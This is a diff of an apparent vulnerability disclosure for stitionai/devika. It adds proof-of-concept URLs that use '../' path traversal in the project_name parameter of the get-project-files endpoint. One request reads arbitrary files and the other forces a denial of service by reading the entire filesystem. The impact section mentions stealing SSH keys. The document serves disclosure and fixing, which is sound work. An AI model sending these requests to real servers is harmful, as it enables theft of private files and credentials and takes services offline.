@@ -1,10 +1,31 @@
 Title: Path traversal that leads to arbitrary file read and Denial of Service in stitionai/devika
 
 Proof of Concept: 
+1- Arbitrary File Read
 
+send the following request to the server :
+
+http://localhost:1337/api/get-project-files/?project_name=../../../../../../../../../../../../home/anis/example
+
+this will get the content of all files in example directory
+
+
+
+2- Denial of Service
+
+it can be achieved by specifying project-name as the root directory
+
+send the following request to the server :
+
+http://localhost:1337/api/get-project-files/?project_name=../../../../../../../../../../../../
+
+this will clog up the backend by trying to read and send the entire content of the filesystem in one request leaving the app unresponsive.
+you can check the logs for more details
 
 Impact: 
-This vulnerability allows an attacker to retrieve every file present on the system and achieve Denial of Service. It can have great consequences:Achieving RCE by retrieving private SSH keys
+This vulnerability allows an attacker to retrieve every file present on the system and achieve Denial of Service. It can have great consequences:
+
+Achieving RCE by retrieving private SSH keys
 Reading private files
 Reading source code for application
 Reading configuration files ...
